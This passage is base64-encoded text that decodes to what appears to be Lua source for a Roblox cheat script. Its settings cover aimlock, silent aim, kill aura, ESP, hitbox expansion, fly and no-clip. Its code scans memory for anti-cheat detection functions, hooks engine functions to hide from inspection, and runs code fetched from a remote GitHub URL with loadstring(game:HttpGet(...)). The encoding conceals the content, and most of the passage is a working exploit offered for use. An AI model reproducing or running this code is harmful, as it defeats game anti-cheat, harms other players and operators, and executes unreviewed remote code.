ogVHVyZiDwn5+jIl0gPSBDRnJhbWUubmV3KDEyNSwgNiwgLTQ2Nik7CiAgICAgICAgICAgIFsiWUdaIFR1cmYg8J+foiJdID0gQ0ZyYW1lLm5ldygzLCA2LCAyMjMpOwogICAgICAgICAgICBbIlN0dWRpbyDwn46ZIl0gPSBDRnJhbWUubmV3KDUyMiwgNiwgLTI2KTsKICAgICAgICAgICAgWyJTaG9lIFN0b3JlIPCfkZ8iXSA9IENGcmFtZS5uZXcoNTI1LCA3LCAtMTg0KTsKICAgICAgICAgICAgWyJTZWNvbmQgR3VuIFN0b3JlIPCflKsiXSA9IENGcmFtZS5uZXcoLTQ1OSwgNiwgMzI4KTsKICAgICAgICAgICAgWyJFeGNsdXNpdmUgR3VuIFN0b3JlIPCflKsiXSA9IENGcmFtZS5uZXcoMTEzMSwgNCwgMTczKTsKICAgICAgICB9OwogICAgICAgIAogICAgICAgIFsiU2VsZWN0ZWRfTG9jYXRpb24iXSA9ICIuLi4iOwoKICAgICAgICBbIk1vZGlmaWNhdGlvbnMiXSA9IG5ld3Byb3h5KHRydWUpOwoKICAgICAgICBbIl9Nb2RpZmljYXRpb25zIl0gPSB7CiAgICAgICAgICAgIFsiRGlzYWJsZUphbW1pbmciXSA9IGZhbHNlOwogICAgICAgICAgICBbIk1vZGlmeVNwcmVhZFZhbHVlIl0gPSBmYWxzZTsKICAgICAgICAgICAgWyJNb2RpZnlSZWNvaWxWYWx1ZSJdID0gZmFsc2U7CiAgICAgICAgICAgIFsiQXV0b21hdGljIl0gPSBmYWxzZTsKICAgICAgICAgICAgWyJNb2RpZnlGaXJlUmF0ZSJdID0gZmFsc2U7CiAgICAgICAgICAgIFsiSW5zdGFudEtpbGwiXSA9IGZhbHNlOwogICAgICAgICAgICBbIk1vZGlmeVJlbG9hZFNwZWVkIl0gPSBmYWxzZTsKICAgICAgICAgICAgWyJNb2RpZnlFcXVpcFNwZWVkIl0gPSBmYWxzZTsKICAgICAgICAgICAgWyJJbmZpbml0ZUFtbW8iXSA9IGZhbHNlOwogICAgICAgICAgICBbIkluZmluaXRlQ2xpcHMiXSA9IGZhbHNlOwoKICAgICAgICAgICAgWyJGaXJlUmF0ZVNwZWVkIl0gPSA1MDsKICAgICAgICAgICAgWyJTcHJlYWRQZXJjZW50YWdlIl0gPSA1MDsKICAgICAgICAgICAgWyJSZWNvaWxQZXJjZW50YWdlIl0gPSA1MDsKICAgICAgICAgICAgWyJSZWxvYWRTcGVlZCJdID0gNTA7CiAgICAgICAgICAgIFsiRXF1aXBTcGVlZCJdID0gNTA7CiAgICAgICAgfTsKCiAgICAgICAgWyJQbGF5ZXJVdGlsaXRpZXMiXSA9IHsKICAgICAgICAgICAgWyJTZWxlY3RlZFBsYXllciJdID0gIi4uLiI7CiAgICAgICAgICAgIFsiQnJpbmdpbmdQbGF5ZXIiXSA9IGZhbHNlOwogICAgICAgICAgICBbIlNwZWN0YXRlUGxheWVyIl0gPSBmYWxzZTsKICAgICAgICB9OwoKICAgICAgICBbIlZlaGljbGVNb2RpZmljYXRpb25zIl0gPSB7CiAgICAgICAgICAgIFsiU3BlZWRFbmFibGVkIl0gPSBmYWxzZTsKICAgICAgICAgICAgWyJTcGVlZFZhbHVlIl0gPSAxMC8xMDAwOwogICAgICAgICAgICBbIkJyZWFrRW5hYmxlZCJdID0gZmFsc2U7CiAgICAgICAgICAgIFsiQnJlYWtWYWx1ZSJdID0gNTAvMTAwMDsKICAgICAgICAgICAgWyJJbnN0YW50U3RvcCJdID0gZmFsc2U7CiAgICAgICAgICAgIFsiSW5zdGFudFN0b3BCaW5kIl0gPSBFbnVtLktleUNvZGUuVjsKICAgICAgICB9OwoKICAgICAgICBbIktpbGxBdXJhIl0gPSBmYWxzZTsKICAgICAgICBbIktpbGxBdXJhUmFuZ2UiXSA9IDEwMDsKICAgICAgICBbIktpbGxBdXJhV2hpdGVsaXN0Il0gPSB7fTsKICAgIH07CgogICAgWyJHYW1lIl0gPSB7CiAgICAgICAgWyJSYXlfU3lzdGVtcyJdID0gKEdhbWVfTmFtZSA9PSAiUm9hZCBUbyBSaWNoZXMiIGFuZCB7IlJheWNhc3QifSBvciBHYW1lX05hbWUgPT0gIkJsb2NrU3BpbiIgYW5kIHsiUmF5Y2FzdCJ9IG9yIEdhbWVfTmFtZSA9PSAiVG93biIgYW5kIHsiUmF5Y2FzdCJ9IG9yIEdhbWVfTmFtZSA9PSAiVW5pdmVyc2FsIiBhbmQgeyJSYXljYXN0IiwiRmluZFBhcnRPblJheSIsIkZpbmRQYXJ0T25SYXlXaXRoV2hpdGVsaXN0In0gb3IgR2FtZV9OYW1lID09ICJUaGUgQnJvbngiIGFuZCB7IkZpbmRQYXJ0T25SYXkifSAgb3IgR2FtZV9OYW1lID09ICJTb3V0aCBCcm9ueCIgYW5kIHsiUmF5Y2FzdCJ9IG9yIEdhbWVfTmFtZSA9PSAiU3RyZWV0IExpZmUiIGFuZCB7IlJheWNhc3QifSBvciBHYW1lX05hbWUgPT0gIkNyaW1pbmFsaXR5IiBhbmQgeyJSYXljYXN0In0pIG9yIHt9OwogICAgICAgIFsiV2FsbF9CYW5nX1Bvc3NpYmxlIl0gPSAoKEdhbWVfTmFtZSA9PSAiVW5pdmVyc2FsIiBvciBHYW1lX05hbWUgPT0gIkNyaW1pbmFsaXR5IiBvciBHYW1lX05hbWUgPT0gIlNvdXRoIEJyb254IiBvciBHYW1lX05hbWUgPT0gIlRoZSBCcm9ueCIgb3IgR2FtZV9OYW1lID09ICJTdHJlZXQgTGlmZSIpKTsKICAgIH07CgogICAgWyJBaW1sb2NrIl0gPSB7CiAgICAgICAgWyJFbmFibGVkIl0gPSBmYWxzZTsKICAgICAgICBbIkFpbWluZyJdID0gZmFsc2U7CiAgICAgICAgWyJUYXJnZXRQYXJ0Il0gPSAiSGVhZCI7CiAgICAgICAgWyJNYXhEaXN0YW5jZSJdID0gMzAwOwogICAgICAgIFsiTW9kZSJdID0gIlRvZ2dsZSI7IAogICAgICAgIFsiVHlwZSJdID0gIk1vdXNlIjsgCiAgICAgICAgWyJLZXliaW5kIl0gPSBuaWw7CiAgICAgICAgWyJXYWxsQ2hlY2siXSA9IGZhbHNlOwogICAgICAgIFsiUHJpb3JpdHkiXSA9IHt9OwogICAgICAgIFsiV2hpdGVsaXN0ZWQiXSA9IHt9OwogICAgICAgIFsiRHJhd0ZpZWxkT2ZWaWV3Il0gPSBmYWxzZTsKICAgICAgICBbIlVzZUZpZWxkT2ZWaWV3Il0gPSBmYWxzZTsKICAgICAgICBbIlJhZGl1cyJdID0gMTAwOwogICAgICAgIFsiRmllbGRPZlZpZXdDb2xvciJdID0gQ29sb3IzLm5ldygxLDEsMSk7CiAgICAgICAgWyJGaWVsZE9mVmlld1RyYW5zcGFyZW5jeSJdID0gMC4yNTsKICAgICAgICBbIlNpZGVzIl0gPSAxMDA7CiAgICAgICAgWyJTbW9vdGhuZXNzIl0gPSAxOwogICAgICAgIFsiU25hcGxpbmUiXSA9IGZhbHNlOwogICAgICAgIFsiU25hcGxpbmVDb2xvciJdID0gQ29sb3IzLm5ldygxLDEsMSk7CiAgICAgICAgWyJTbmFwbGluZVRoaWNrbmVzcyJdID0gMTsKICAgIH07CgogICAgWyJTaWxlbnQiXSA9IHsKICAgICAgICBbIkVuYWJsZWQiXSA9IGZhbHNlOwogICAgICAgIFsiVGFyZ2V0dGluZyJdID0gZmFsc2U7CiAgICAgICAgWyJUYXJnZXRQYXJ0Il0gPSB7IkhlYWQifTsKICAgICAgICBbIk1vZGUiXSA9ICJuaWwiOwogICAgICAgIFsiTWF4RGlzdGFuY2UiXSA9IDMwMDsKICAgICAgICBbIktleWJpbmQiXSA9IG5pbDsKICAgICAgICBbIldhbGxDaGVjayJdID0gZmFsc2U7CiAgICAgICAgWyJXYWxsQmFuZyJdID0gZmFsc2U7CiAgICAgICAgWyJQcmlvcml0eSJdID0ge307CiAgICAgICAgWyJXaGl0ZWxpc3RlZCJdID0ge307CiAgICAgICAgWyJEcmF3RmllbGRPZlZpZXciXSA9IGZhbHNlOwogICAgICAgIFsiVXNlRmllbGRPZlZpZXciXSA9IGZhbHNlOwogICAgICAgIFsiUmFkaXVzIl0gPSAxMDA7CiAgICAgICAgWyJGaWVsZE9mVmlld0NvbG9yIl0gPSBDb2xvcjMubmV3KDEsMSwxKTsKICAgICAgICBbIkZpZWxkT2ZWaWV3VHJhbnNwYXJlbmN5Il0gPSAwLjI1OwogICAgICAgIFsiU2lkZXMiXSA9IDEwMDsKICAgICAgICBbIkhpdENoYW5jZSJdID0gMTAwOwogICAgICAgIFsiU25hcGxpbmUiXSA9IGZhbHNlOwogICAgICAgIFsiU25hcGxpbmVDb2xvciJdID0gQ29sb3IzLm5ldygxLDEsMSk7CiAgICAgICAgWyJEYW1hZ2UiXSA9IDEwMDsKICAgICAgICBbIlNuYXBsaW5lVGhpY2tuZXNzIl0gPSAxOwogICAgfTsKCiAgICBbIldvcmxkVmlzdWFscyJdID0gewogICAgICAgIFsiU2F0dXJhdGlvbkVuYWJsZWQiXSA9IGZhbHNlOwogICAgICAgIFsiU2F0dXJhdGlvbl9WYWx1ZSJdID0gMTsKCiAgICAgICAgWyJGb2dDb2xvckVuYWJsZWQiXSA9IGZhbHNlOwogICAgICAgIFsiRm9nQ29sb3IiXSA9IENvbG9yMy5uZXcoMSwxLDEpOwoKICAgICAgICBbIkFtYmllbnRFbmFibGVkIl0gPSBmYWxzZTsKICAgICAgICBbIkFtYmllbnRDb2xvciJdID0gQ29sb3IzLm5ldygxLDEsMSk7CgogICAgICAgIFsiRmllbGRPZlZpZXdFbmFibGVkIl0gPSBmYWxzZTsKICAgICAgICBbIkZpZWxkT2ZWaWV3VmFsdWUiXSA9IDcwOwoKICAgICAgICBbIkZ1bGxicmlnaHQiXSA9IGZhbHNlOwogICAgfTsKCiAgICBbIk1pc2NTZXR0aW5ncyJdID0gewogICAgICAgIFsiSGl0Ym94X0V4cGFuZGVyIl0gPSB7CiAgICAgICAgICAgIFsiRW5hYmxlZCJdID0gZmFsc2U7CiAgICAgICAgICAgIFsiTXVsdGlwbGllciJdID0gMTU7CiAgICAgICAgICAgIFsiQ29sb3IiXSA9IENvbG9yMy5uZXcoMSwxLDEpOwogICAgICAgICAgICBbIlRyYW5zcGFyZW5jeSJdID0gMDsKICAgICAgICAgICAgWyJUeXBlIl0gPSAiQmxvY2siOwogICAgICAgICAgICBbIk1hdGVyaWFsIl0gPSAiRm9yY2VGaWVsZCI7CiAgICAgICAgICAgIFsiV2hpdGVsaXN0Il0gPSB7fTsKICAgICAgICAgICAgWyJQYXJ0Il0gPSAiSHVtYW5vaWRSb290UGFydCI7CiAgICAgICAgfTsKCiAgICAgICAgWyJNb2RpZnlTcGVlZCJdID0gewogICAgICAgICAgICBbIkVuYWJsZWQiXSA9IGZhbHNlOwogICAgICAgICAgICBbIlZhbHVlIl0gPSAxNjsKICAgICAgICB9OwoKICAgICAgICBbIk1vZGlmeUp1bXAiXSA9IHsKICAgICAgICAgICAgWyJFbmFibGVkIl0gPSBmYWxzZTsKICAgICAgICAgICAgWyJJbmZpbml0eSJdID0gZmFsc2U7CiAgICAgICAgICAgIFsiVmFsdWUiXSA9IDUwOwogICAgICAgIH07CgogICAgICAgIFsiRmx5Il0gPSB7CiAgICAgICAgICAgIFsiRW5hYmxlZCJdID0gZmFsc2U7CiAgICAgICAgICAgIFsiU3BlZWQiXSA9IDUwOwogICAgICAgIH07CgogICAgICAgIFsiU3BpbkJvdCJdID0gewogICAgICAgICAgICBbIkVuYWJsZWQiXSA9IGZhbHNlOwogICAgICAgICAgICBbIlNwZWVkIl0gPSAzNTsKICAgICAgICB9OwoKICAgICAgICBbIk5vLUNsaXAiXSA9IGZhbHNlOwogICAgfTsKCiAgICBbIkd1bnMiXSA9IHt9OwoKICAgIEVTUCA9IHsKICAgICAgICBFbmFibGVkID0gZmFsc2UsCiAgICAgICAgVGVhbUNoZWNrID0gZmFsc2UsCiAgICAgICAgTWF4RGlzdGFuY2UgPSA1MDAsCiAgICAgICAgRm9udFNpemUgPSAxMiwKICAgICAgICBGb250ID0gRW51bS5Gb250LkNvZGUsCiAgICAgICAgRmFkZU91dCA9IHsKICAgICAgICAgICAgT25EaXN0YW5jZSA9IGZhbHNlLAogICAgICAgICAgICBPbkRlYXRoID0gdHJ1ZSwKICAgICAgICAgICAgT25MZWF2ZSA9IGZhbHNlLAogICAgICAgIH0sCiAgICAgICAgT3B0aW9ucyA9IHsgCiAgICAgICAgICAgIFRlYW1jaGVjayA9IHRydWUsIFRlYW1jaGVja1JHQiA9IENvbG9yMy5mcm9tUkdCKDAsIDI1NSwgMCksCiAgICAgICAgICAgIEZyaWVuZGNoZWNrID0gdHJ1ZSwgRnJpZW5kY2hlY2tSR0IgPSBDb2xvcjMuZnJvbVJHQigwLCAyNTUsIDApLAogICAgICAgICAgICBIaWdobGlnaHQgPSBmYWxzZSwgSGlnaGxpZ2h0UkdCID0gQ29sb3IzLmZyb21SR0IoMjU1LCAwLCAwKSwKICAgICAgICB9LAogICAgICAgIERyYXdpbmcgPSB7CiAgICAgICAgICAgIENoYW1zID0gewogICAgICAgICAgICAgICAgRW5hYmxlZCAgPSBmYWxzZSwKICAgICAgICAgICAgICAgIFRoZXJtYWwgPSB0cnVlLAogICAgICAgICAgICAgICAgRmlsbFJHQiA9IENvbG9yMy5mcm9tUkdCKDExOSwgMTIwLCAyNTUpLAogICAgICAgICAgICAgICAgRmlsbF9UcmFuc3BhcmVuY3kgPSA4MCwKICAgICAgICAgICAgICAgIE91dGxpbmVSR0IgPSBDb2xvcjMuZnJvbVJHQigwLDAsMCksCiAgICAgICAgICAgICAgICBPdXRsaW5lX1RyYW5zcGFyZW5jeSA9IDgwLAogICAgICAgICAgICAgICAgVmlzaWJsZUNoZWNrID0gZmFsc2UsCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIE5hbWVzID0gewogICAgICAgICAgICAgICAgRW5hYmxlZCA9IGZhbHNlLAogICAgICAgICAgICAgICAgVHJhbnNwYXJlbmN5ID0gMCwKICAgICAgICAgICAgICAgIFJHQiA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpLAogICAgICAgICAgICB9LAogICAgICAgICAgICBGbGFncyA9IHsKICAgICAgICAgICAgICAgIEVuYWJsZWQgPSBmYWxzZSwKICAgICAgICAgICAgfSwKICAgICAgICAgICAgRGlzdGFuY2VzID0gewogICAgICAgICAgICAgICAgRW5hYmxlZCA9IGZhbHNlLCAKICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gIkJvdHRvbSIsCiAgICAgICAgICAgICAgICBUcmFuc3BhcmVuY3kgPSAwLAogICAgICAgICAgICAgICAgUkdCID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSksCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIFdlYXBvbnMgPSB7CiAgICAgICAgICAgICAgICBFbmFibGVkID0gZmFsc2UsIFdlYXBvblRleHRSR0IgPSBDb2xvcjMuZnJvbVJHQigxMTksIDEyMCwgMjU1KSwKICAgICAgICAgICAgICAgIE91dGxpbmVkID0gZmFsc2UsCiAgICAgICAgICAgICAgICBHcmFkaWVudCA9IGZhbHNlLAogICAgICAgICAgICAgICAgVHJhbnNwYXJlbmN5ID0gMCwKICAgICAgICAgICAgICAgIEdyYWRpZW50UkdCMSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpLCBHcmFkaWVudFJHQjIgPSBDb2xvcjMuZnJvbVJHQigxMTksIDEyMCwgMjU1KSwKICAgICAgICAgICAgfSwKICAgICAgICAgICAgSW52ZW50b3J5ID0gewogICAgICAgICAgICAgICAgRW5hYmxlZCA9IGZhbHNlLCBSR0IgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KSwKICAgICAgICAgICAgICAgIFRyYW5zcGFyZW5jeSA9IDAsCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIEhlYWx0aGJhciA9IHsKICAgICAgICAgICAgICAgIEVuYWJsZWQgPSBmYWxzZSwgIAogICAgICAgICAgICAgICAgSGVhbHRoVGV4dCA9IGZhbHNlLCBMZXJwID0gdHJ1ZSwgSGVhbHRoVGV4dFJHQiA9IENvbG9yMy5mcm9tUkdCKDAsIDI1NSwgMCksCiAgICAgICAgICAgICAgICBXaWR0aCA9IDIuNSwKICAgICAgICAgICAgICAgIFRyYW5zcGFyZW5jeSA9IDAsCiAgICAgICAgICAgICAgICBIZWFsdGhUZXh0VHJhbnNwYXJlbmN5ID0gMCwKICAgICAgICAgICAgICAgIEdyYWRpZW50ID0gdHJ1ZSwgR3JhZGllbnRSR0IxID0gQ29sb3IzLmZyb21SR0IoMjU1LCAwLCAwKSwgR3JhZGllbnRSR0IyID0gQ29sb3IzLmZyb21SR0IoMCwyNTUsMCkKICAgICAgICAgICAgfSwKICAgICAgICAgICAgQm94ZXMgPSB7CiAgICAgICAgICAgICAgICBBbmltYXRlID0gdHJ1ZSwKICAgICAgICAgICAgICAgIFJvdGF0aW9uU3BlZWQgPSAzMDAsCiAgICAgICAgICAgICAgICBHcmFkaWVudCA9IGZhbHNlLCBHcmFkaWVudFJHQjEgPSBDb2xvcjMuZnJvbVJHQigxMTksIDEyMCwgMjU1KSwgR3JhZGllbnRSR0IyID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCksIAogICAgICAgICAgICAgICAgR3JhZGllbnRGaWxsID0gdHJ1ZSwgR3JhZGllbnRGaWxsUkdCMSA9IENvbG9yMy5mcm9tUkdCKDExOSwgMTIwLCAyNTUpLCBHcmFkaWVudEZpbGxSR0IyID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCksIAogICAgICAgICAgICAgICAgRmlsbGVkID0gewogICAgICAgICAgICAgICAgICAgIEVuYWJsZWQgPSBmYWxzZSwKICAgICAgICAgICAgICAgICAgICBUcmFuc3BhcmVuY3kgPSAwLjc1LAogICAgICAgICAgICAgICAgICAgIFJHQiA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApLAogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgIEZ1bGwgPSB7CiAgICAgICAgICAgICAgICAgICAgRW5hYmxlZCA9IHRydWUsCiAgICAgICAgICAgICAgICAgICAgVHJhbnNwYXJlbmN5ID0gMCwKICAgICAgICAgICAgICAgICAgICBSR0IgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KSwKICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICBCb3VuZGluZyA9IHsKICAgICAgICAgICAgICAgICAgICBFbmFibGVkID0gZmFsc2UsCiAgICAgICAgICAgICAgICAgICAgVHJhbnNwYXJlbmN5ID0gMCwKICAgICAgICAgICAgICAgICAgICBSR0IgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KSwKICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICBDb3JuZXIgPSB7CiAgICAgICAgICAgICAgICAgICAgRW5hYmxlZCA9IGZhbHNlLAogICAgICAgICAgICAgICAgICAgIFRyYW5zcGFyZW5jeSA9IDAsCiAgICAgICAgICAgICAgICAgICAgUkdCID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSksCiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICB9OwogICAgICAgIH07CiAgICAgICAgQ29ubmVjdGlvbnMgPSB7CiAgICAgICAgICAgIFJ1blNlcnZpY2UgPSBTZXJ2aWNlcy5SdW5TZXJ2aWNlOwogICAgICAgIH07CiAgICAgICAgRm9udHMgPSB7fTsKICAgIH07Cn07CgotLVtbaWYgbm90IFNvbGFyYSBhbmQgR2FtZV9OYW1lID09ICJUaGUgQnJvbngiIHRoZW4KICAgIGxvY2FsIERUQzsKCiAgICByZXBlYXQgdGFzay53YWl0KC4yNSkgTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oKQogICAgICAgIGZvciBJbmRleCwgVmFsdWUgaW4gbmV4dCwgZ2V0Z2ModHJ1ZSkgZG8KICAgICAgICAgICAgaWYgdHlwZShWYWx1ZSkgPT0gInRhYmxlIiB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCBEZXRlY3RlZCA9IHJhd2dldChWYWx1ZSwgIkRldGVjdGVkIik7CiAgICAgICAgICAgICAgICBpZiB0eXBlKERldGVjdGVkKSA9PSAiZnVuY3Rpb24iIHRoZW4KICAgICAgICAgICAgICAgICAgICBEVEMgPSBEZXRlY3RlZAogICAgICAgICAgICAgICAgZW5kOwogICAgICAgICAgICBlbmQ7CiAgICAgICAgZW5kOwogICAgZW5kKSgpCgogICAgdW50aWwgRFRDIH49IG5pbAplbmRdXQoKZ2V0Z2VudigpLmxpYnJhcnkgPSB7CiAgICBkaXJlY3RvcnkgPSAiUmVkbGluZSIsCiAgICBmb2xkZXJzID0gewogICAgICAgICIvZm9udHMiLAogICAgICAgICIvY29uZmlncyIsCiAgICAgICAgIi9hc3NldHMiCiAgICB9LAogICAgcHJpb3JpdHkgPSB7fSwKICAgIHdoaXRlbGlzdCA9IHt9LAogICAgZmxhZ3MgPSB7fSwKICAgIGNvbmZpZ19mbGFncyA9IHt9LAogICAgY29ubmVjdGlvbnMgPSB7fSwgICAKICAgIG5vdGlmaWNhdGlvbnMgPSB7bm90aWZzID0ge319LAogICAgY3VycmVudF9vcGVuOyAKfQoKbG9jYWwgSW1hZ2VzID0geyJFU1AucG5nIiwgIldvcmxkLnBuZyIsICJXcmVuY2gucG5nIiwgIlNldHRpbmdzLnBuZyIsICJOb2RlLnBuZyIsICJjdXJzb3IucG5nIiwgIkJ1bGxldC5wbmciLCAiU25hcGxpbmUucG5nIiwgIlBpc3RvbC5wbmciLCAiZm9sZGVyLnBuZyIsICJVWkkucG5nIiwgIkZpZWxkT2ZWaWV3Mi5wbmciLCAiTG9jay5wbmciLCAiQWltbG9jay5wbmciLCAiQ2FzaC5wbmciLCAiV2hlYXR0LnBuZyIsICJQaWNra2F4ZS5wbmciLCAidW5sb2NrZWQucG5nIn0KCmZvciBfLCBwYXRoIGluIG5leHQsIGxpYnJhcnkuZm9sZGVycyBkbyAKICAgIG1ha2Vmb2xkZXIobGlicmFyeS5kaXJlY3RvcnkgLi4gcGF0aCkKZW5kCgpmb3IgSW5kZXgsIFZhbHVlIGluIEltYWdlcyBkbwogICAgbG9jYWwgTG9jYXRpb24gPSBsaWJyYXJ5LmRpcmVjdG9yeS4uIi9hc3NldHMvIi4uVmFsdWUKICAgIGlmIG5vdCBpc2ZpbGUoTG9jYXRpb24pIHRoZW4KICAgICAgICBsb2NhbCBJbWFnZURpZGR5QWhoQmx1ZCA9IGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0tpbmdWb25PQmxvY2tKb3ljZS9pbWFnZXNzeW5leC9tYWluLyIuLlZhbHVlKQogICAgICAgIHJlcGVhdCB3YWl0KCkgdW50aWwgSW1hZ2VEaWRkeUFoaEJsdWQgfj0gbmlsCiAgICAgICAgd3JpdGVmaWxlKExvY2F0aW9uLCBJbWFnZURpZGR5QWhoQmx1ZCkKICAgIGVuZAplbmQKCkdldEltYWdlID0gTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oTmFtZSkKICAgIGxvY2FsIExvY2F0aW9uID0gbGlicmFyeS5kaXJlY3RvcnkuLiIvYXNzZXRzLyIuLk5hbWUKICAgIGlmIGlzZmlsZShMb2NhdGlvbikgdGhlbgogICAgICAgIHJldHVybiBnZXRjdXN0b21hc3NldChMb2NhdGlvbikKICAgIGVuZAplbmQpCgpsb2NhbCBDb2xsaWRlX0RhdGEgPSB7fQoKbG9jYWwgRGVmYXVsdFBsYXllclNldHRpbmdzID0ge30KCmlmIG5vdCBTZXJ2aWNlcy5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlciB0aGVuCiAgICBTZXJ2aWNlcy5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlckFkZGVkOldhaXQoKQogICAgdGFzay53YWl0KDEpCmVuZAoKZm9yIEluZGV4LCBWYWx1ZSBpbiBTZXJ2aWNlcy5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpHZXREZXNjZW5kYW50cygpIGRvCiAgICBwY2FsbChMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbigpCiAgICAgICAgaWYgVmFsdWUuQ2FuQ29sbGlkZSA9PSB0cnVlIHRoZW4KICAgICAgICAgICAgQ29sbGlkZV9EYXRhW1ZhbHVlLk5hbWVdID0gdHJ1ZQogICAgICAgIGVuZAogICAgZW5kKSkKZW5kCgppZiBub3QgU29sYXJhIHRoZW4KICAgIGlmIEdhbWVfTmFtZSA9PSAiQmxvY2tTcGluIiB0aGVuCiAgICAgICAgTFBIX0pJVF9NQVgoZnVuY3Rpb24oKQogICAgICAgICAgICBsb2NhbCBSZXByID0gbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9Penp5cGlnL3JlcHIvcmVmcy9oZWFkcy9tYXN0ZXIvcmVwci5sdWEiKSkoKQoKCQlsb2NhbCBSZXF1aXJlZCA9IHsKCQkJImhvb2tmdW5jdGlvbiIsCgkJCSJnZXR0aHJlYWRjb250ZXh0IiwKCQkJImdldGNvbm5lY3Rpb25zIiwKCQkJInNldHRocmVhZGNvbnRleHQiLAoJCQkiaXNleGVjdXRvcmNsb3N1cmUiLAoJCQkiaG9va21ldGFtZXRob2QiLAoJCQkiZ2V0cmVudiIsCgkJfQoKCQlmb3IgXywgdiBpbiBuZXh0LCBSZXF1aXJlZCBkbwoJCQlpZiBub3QgZ2V0Z2VudigpW3ZdIHRoZW4KCQkJCWdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyOktpY2soYFlvdXIgZXhlY3V0b3IgZG9lcyBub3Qgc3VwcG9ydCBbe3Z9XSwgd2hpY2ggaXMgUkVRVUlSRUQgdG8gdXNlIHRoZSBCbG9ja1NwaW4gc2NyaXB0LmApCgkJCWVuZAoJCWVuZAoKCQlsb2NhbCBPbGREZWJ1Z1RyYWNlYmFjaywgT2xkRGVidWdJbmZvLCBPbGRGZW52ID0gZGVidWcudHJhY2ViYWNrLCBkZWJ1Zy5pbmZvLCBnZXRmZW52CgoJCWxvY2FsIEJsYWNrbGlzdGVkUmVtb3RlQXJndW1lbnROZWVkbGVzID0gewoJCQkiaW52YWxpZF9lbnRyeSIsCgkJCSJyZXBsaWNhdGVfYmlsIiwKCQl9CgoJCWxvY2FsIEJsYWNrbGlzdGVkQ2FsbGVyTmVlZGxlcyA9IHsKCQkJIk9iZnVzY2F0ZWQiLAoJCX0KCgkJaWYgbm90IHNoYXJlZC5Ib29raW5nIHRoZW4KCQkJc2hhcmVkLkhvb2tpbmcgPSB7fQoJCWVuZAoKCQlpZiBub3Qgc2hhcmVkLkhvb2tpbmcuSW5jbHVkZUluU3RhY2tGdW5jdGlvbnMgdGhlbgoJCQlzaGFyZWQuSG9va2luZy5JbmNsdWRlSW5TdGFja0Z1bmN0aW9ucyA9IHt9CgkJZW5kCgoJCXNoYXJlZC5TYWZlSG9vayA9IGZ1bmN0aW9uKE9yaWdpbmFsLCBSZXBsYWNlbWVudCkKCQkJc2hhcmVkLkhvb2tpbmcuSW5jbHVkZUluU3RhY2tGdW5jdGlvbnNbT3JpZ2luYWxdID0gdHJ1ZQoJCQlyZXR1cm4gaG9va2Z1bmN0aW9uKE9yaWdpbmFsLCBSZXBsYWNlbWVudCkKCQllbmQKCgkJbG9jYWwgQ29yZUd1aSA9IGdhbWU6R2V0U2VydmljZSgiQ29yZUd1aSIpCgkJbG9jYWwgUm9ibG94R3VpcyA9IHsKCQkJIlJvYmxveEd1aSIsCgkJCSJUZWxlcG9ydEd1aSIsCgkJCSJSb2Jsb3hQcm9tcHRHdWkiLAoJCQkiUm9ibG94TG9hZGluZ0d1aSIsCgkJCSJQbGF5ZXJMaXN0IiwKCQkJIlJvYmxveE5ldHdvcmtQYXVzZU5vdGlmaWNhdGlvbiIsCgkJCSJQdXJjaGFzZVByb21wdCIsCgkJCSJIZWFkc2V0RGlzY29ubmVjdGVkRGlhbG9nIiwKCQkJIlRoZW1lUHJvdmlkZXIiLAoJCQkiRGV2Q29uc29sZU1hc3RlciIsCgkJfQoKCQlsb2NhbCBmdW5jdGlvbiBGaWx0ZXJUYWJsZShJbnB1dFRhYmxlKQoJCQlsb2NhbCBPbGRDb250ZXh0ID0gZ2V0dGhyZWFkY29udGV4dCgpCgkJCXNldHRocmVhZGNvbnRleHQoNykKCgkJCWxvY2FsIEZpbHRlcmVkID0ge30KCQkJbG9jYWwgR2FtZUluc3RhbmNlID0gZ2FtZQoKCQkJZm9yIEluZGV4LCBWYWx1ZSBpbiBpcGFpcnMoSW5wdXRUYWJsZSkgZG8KCQkJCWlmIHR5cGVvZihWYWx1ZSkgfj0gIkluc3RhbmNlIiB0aGVuCgkJCQkJdGFibGUuaW5zZXJ0KEZpbHRlcmVkLCBWYWx1ZSkKCQkJCWVsc2UKCQkJCQlpZiBWYWx1ZSA9PSBDb3JlR3VpIG9yIFZhbHVlID09IEdhbWVJbnN0YW5jZSB0aGVuCgkJCQkJCS0tIEluc2VydCBvbmx5IHRoZSBkZWZhdWx0IFJvYmxveCBHVUlzCgkJCQkJCWZvciBfLCBHdWlOYW1lIGluIHBhaXJzKFJvYmxveEd1aXMpIGRvCgkJCQkJCQlsb2NhbCBHdWlJbnN0YW5jZSA9IENvcmVHd